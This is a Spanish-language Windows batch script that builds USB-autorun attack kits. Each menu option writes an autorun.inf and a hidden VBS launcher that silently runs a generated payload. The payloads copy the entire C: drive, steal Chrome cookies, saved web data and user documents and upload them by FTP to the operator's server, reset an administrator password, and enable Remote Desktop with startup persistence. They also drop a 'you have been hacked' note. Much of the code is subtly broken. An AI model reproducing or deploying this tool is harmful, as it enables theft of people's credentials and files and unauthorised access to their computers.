color OB
echo off
TITLE Bienvenid@ %USERNAME%
MODE con:cols=80 lines=40
echo.
Echo --------------------------------------------------------------------------------------
Echo Primero conecta tu USB y pasa este mismio archivo dentro y luego responde las pregunta.
Echo --------------------------------------------------------------------------------------
echo.
set/p letra=¿Cual es la letra de la unidad de tu PEN-DRIVE?
echo.
pause>nul
cls
set/p letra=¿Como se llama tu PEN-DRIVE?
echo.
pause>nul
cls
set/p IP1=¿Cual es tu IP para un acceso remoto a una pc?
echo.
pause>nul
cls
set/p IP=¿Cual es tu IP de tu servidor FTP?
echo.
pause>nul
cls
Echo ____  __  ____  __ _  _  _  ____  __ _  __  ____   __
Echo(  _ \(  )(  __)(  ( \/ )( \(  __)(  ( \(  )(    \ /  \
Echo ) _ ( )(  ) _) /    /\ \/ / ) _) /    / )(  ) D ((  O )
Echo(____/(__)(____)\_)__) \__/ (____)\_)__)(__)(____/ \__/
echo.
Echo ------------------------------------------------------------------------------
Echo Elije Una Opcion para generar el .bat que usaras, elije sabiamente.
Echo ------------------------------------------------------------------------------

:inicio
SET var=0
cls
echo ------------------------------------------------------------------------------
echo  %DATE% ^| %TIME%
echo ------------------------------------------------------------------------------
echo  1-Copiar TODO el disco duro
echo  2-Copiar extensiones determinadas, cookies, claves guardadas wifi, ftp
echo  3-Bat para cambiar la contraseña del administrador
echo  4-Generarado para ocultar y mostrar archivos en la pc
echo  5-Tener acceso remoto a la pc
echo  6-Salir
echo ------------------------------------------------------------------------------
echo.
SET /p var= ^> Seleccione un numero dependiendo de la opcion. [1-3]:

if "%var%"=="0" goto inicio
if "%var%"=="1" goto op1
if "%var%"=="2" goto op2
if "%var%"=="3" goto op3
if "%var%"=="4" goto op4
if "%var%"=="5" goto op5
if "%var%"=="6" goto salir

echo. Por favor, no sea estupido y ponga un numero valido y no "%var%" que no es una opcion valida.
echo.
pause
echo.
goto:inicio

:op1
echo [autorun] > autorun.inf.
echo ;Open=2Plano.vbs >> autorun.inf.
echo ShellExecute=2Plano.vbs >> autorun.inf.
echo UseAutoPlay=5 >> autorun.inf

echo Dim WinScriptHost >  2Plano.vbs
echo Set WinScriptHost = CreateObject("WScript.Shell") >> 2Plano.vbs
echo WinScriptHost.Run Chr(34) & "Ds.bat" & Chr(34), 0 >> 2Plano.vbs
echo Set WinScriptHost = Nothing >>  2Plano.vbs

echo @echo off > Ds.bat
echo xcopy c:\*.* %letra%:\ /h/i/c/k/e/r >> Ds.bat

PAUSE
goto:inicio

:op2

echo [autorun] > autorun.inf.
echo ;Open=2Plano.vbs >> autorun.inf.
echo ShellExecute=2Plano.vbs >> autorun.inf.
echo UseAutoPlay=5 >> autorun.inf

echo Dim WinScriptHost > 2Plano.vbs
echo Set WinScriptHost = CreateObject("WScript.Shell") >> 2Plano.vbs
echo WinScriptHost.Run Chr(34) & "Opcion2.bat" & Chr(34), 0 >> 2Plano.vbs
echo Set WinScriptHost = Nothing >> 2Plano.vbs

echo @echo off > Opcion2.bat
echo title Ladron >> Opcion2.bat
echo start Get-WlanProfiles.bat >> Opcion2.bat
echo start Get-WlanProfiles.bat >> Opcion2.bat
echo echo Has sido hackeado %USERNAME% por MI ANONIMO :) > C:\Users\%USERNAME%\Downloads\MiraEsteArchivo.txt >> Opcion2.bat
echo IF NOT EXIST ".\Datos\"%USERNAME% MD ".\Datos\"%USERNAME% >> Opcion2.bat
echo cd ".\Datos\"%USERNAME% >> Opcion2.bat
echo systeminfo > OS.txt >> Opcion2.bat

echo XCOPY "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\cookies" ".\Datos\" >> Opcion2.bat
echo XCOPY "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Web Data" ".\Datos\" >> Opcion2.bat
echo XCOPY "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Web Data-journal" ".\Datos\"
echo for /R %USERPROFILE%\Pictures\ %%x in (*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg.aca*.acs*.ani*.odt*.doc*.odp*.ppt*.ods*.xls*.gif*.tif*.tiff*.png*.bmp*.cda*.mp3*.ogg*.wav*..tar /.tar.gz /.tar.Z*/.tgz*.zip*.swf*.flv*.JClic*.xbk*.notebook*.iso*.html*.cpp*.dll*) do xcopy "%%x" ".\Datos" /h/i/c/k/e/r >> Opcion2.bat
echo for /R %USERPROFILE%\Documents\ %%x in (*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg.aca*.acs*.ani*.odt*.doc*.odp*.ppt*.ods*.xls*.gif*.tif*.tiff*.png*.bmp*.cda*.mp3*.ogg*.wav*..tar /.tar.gz /.tar.Z*/.tgz*.zip*.swf*.flv*.JClic*.xbk*.notebook*.iso*.html*.cpp*.dll*) do xcopy "%%x" ".\Datos" /h/i/c/k/e/r >> Opcion2.bat
echo for /R %USERPROFILE%\Desktop\ %%x in (*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg.aca*.acs*.ani*.odt*.doc*.odp*.ppt*.ods*.xls*.gif*.tif*.tiff*.png*.bmp*.cda*.mp3*.ogg*.wav*..tar /.tar.gz /.tar.Z*/.tgz*.zip*.swf*.flv*.JClic*.xbk*.notebook*.iso*.html*.cpp*.dll*) do xcopy "%%x" ".\Datos" /h/i/c/k/e/r >> Opcion2.bat
echo for /R %USERPROFILE%\Windows\ %%x in (*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg.aca*.acs*.ani*.odt*.doc*.odp*.ppt*.ods*.xls*.gif*.tif*.tiff*.png*.bmp*.cda*.mp3*.ogg*.wav*..tar /.tar.gz /.tar.Z*/.tgz*.zip*.swf*.flv*.JClic*.xbk*.notebook*.iso*.html*.cpp*.dll*) do xcopy "%%x" ".\Datos" /h/i/c/k/e/r >> Opcion2.bat
echo ftp  >> Opcion2.bat
echo cd ".\Datos\"%USERNAME%  >> Opcion2.bat
echo ftp %IP%  >> Opcion2.bat
echo put Web Data  >> Opcion2.bat
echo put Web Data-journal  >> Opcion2.bat
echo put Web Data  >> Opcion2.bat
echo put  >> Opcion2.bat
 echo exit >> Opcion2.bat
 
PAUSE
goto:inicio

:op3

echo [autorun] > autorun.inf.
echo ;Open=2Plano.vbs >> autorun.inf.
echo ShellExecute=2Plano.vbs >> autorun.inf.
echo UseAutoPlay=5 >> autorun.inf

echo Dim WinScriptHost > 2Plano.vbs
echo Set WinScriptHost = CreateObject("WScript.Shell") >> 2Plano.vbs
echo WinScriptHost.Run Chr(34) & "Opcion3.bat" & Chr(34), 0 >> 2Plano.vbs
echo Set WinScriptHost = Nothing >> 2Plano.vbs

echo @echo off > Opcion3.bat
color 1e >> Opcion3.bat
echo ------------------------------------------------------------------------------ >> Opcion3.bat
echo. >> Opcion3.bat
echo Se mostrara los usuarios de la pc y se guardara todo en un txt >> Opcion3.bat
echo. >> Opcion3.bat
echo ------------------------------------------------------------------------------ >> Opcion3.bat
echo echo net user > Usuarios.txt >> Opcion3.bat
echo set/p usuario=CUAL ES EL NOMBRE DEL USUARIO AL QUE DESEAS CAMBIARLE LA CONTRASEÑA: >> Opcion3.bat
echo echo. >> Opcion3.bat
echo set contra= 1234 >> Opcion3.bat
echo cls >> Opcion3.bat
echo echo net user %usuario% 1234 > Usuarios.txt >> Opcion3.bat
echo echo Se cambio la pass por 123 y fue guardado nuevamente en el mismo archivo. >> Opcion3.bat
echo echo. >> Opcion3.bat

PAUSE
goto:inicio

:op4

echo [autorun] > autorun.inf.
echo ;Open=2Plano.vbs >> autorun.inf.
echo ShellExecute=2Plano.vbs >> autorun.inf.
echo UseAutoPlay=5 >> autorun.inf

echo Dim WinScriptHost > 2Plano.vbs
echo Set WinScriptHost = CreateObject("WScript.Shell") >> 2Plano.vbs
echo WinScriptHost.Run Chr(34) & "Opcion4.bat" & Chr(34), 0 >> 2Plano.vbs
echo Set WinScriptHost = Nothing >> 2Plano.vbs

echo @echo off > Opcion4.bat
color ob >> Opcion4.bat
echo TITLE Bienvenid@ %USERNAME% >> Opcion4.bat
echo MODE con:cols=80 lines=40 >> Opcion4.bat

echo :inicio >> Opcion4.bat
echo SET var=0 >> Opcion4.bat
echo cls >> Opcion4.bat
echo echo ------------------------------------------------------------------------------ >> Opcion4.bat
echo echo  %DATE% ^| %TIME% >> Opcion4.bat
echo echo ------------------------------------------------------------------------------ >> Opcion4.bat
echo echo  1-Mostrar archivos >> Opcion4.bat
echo echo  2-Ocultar archivos >> Opcion4.bat
echo echo  3-Salir >> Opcion4.bat
echo echo ------------------------------------------------------------------------------ >> Opcion4.bat
echo echo.>> Opcion4.bat

echo SET /p var= ^> Seleccione un numero dependiendo de la opcion. [1-3]: >> Opcion4.bat

echo if "%var%"=="0" goto inicio >> Opcion4.bat
echo if "%var%"=="1" goto op1 >> Opcion4.bat
echo if "%var%"=="2" goto op2 >> Opcion4.bat
echo if "%var%"=="3" goto salir >> Opcion4.bat

echo ::Mensaje de error, validación cuando se selecciona una opción fuera de rango
echo echo. Por favor, no sea estupido y ponga un numero valido y no "%var%" que no es una opcion valida. >> Opcion4.bat
echo echo. >> Opcion4.bat
echo pause >> Opcion4.bat
echo echo. >> Opcion4.bat
echo goto:inicio >> Opcion4.bat

echo :op1 >> Opcion4.bat
echo Echo Pon tus archivos aqui para hacerlos visibles. >> Opcion4.bat
echo ATTRIB -R -A -S -H *.* /S /D >> Opcion4.bat
echo PAUSE> > Opcion4.bat
echo goto:inicio >> Opcion4.bat

echo :op2

echo Echo Pon tus archivos aqui para ocultarlos.>> Opcion4.bat
echo ATTRIB +R +A +S +H  *.*  /S >> Opcion4.bat

echo PAUSE >> Opcion4.bat
echo goto:inicio >> Opcion4.bat


echo :salir >> Opcion4.bat
echo    @cls&exit >> Opcion4.bat

PAUSE
goto:inicio

:op5
echo [autorun] > autorun.inf.
echo ;Open=2Plano.vbs >> autorun.inf.
echo ShellExecute=2Plano.vbs >> autorun.inf.
echo UseAutoPlay=5 >> autorun.inf

echo Dim WinScriptHost > 2Plano.vbs
echo Set WinScriptHost = CreateObject("WScript.Shell") >> 2Plano.vbs
echo WinScriptHost.Run Chr(34) & "Opcion5.bat" & Chr(34), 0 >> 2Plano.vbs
echo Set WinScriptHost = Nothing >> 2Plano.vbs

echo reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f > Opcion5.bat
echo mstsc /v:%IP1%:12000 /admin /f >> Opcion5.bat
echo xcopy "Opcion5.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

PAUSE
goto:inicio

:salir
    @cls&exit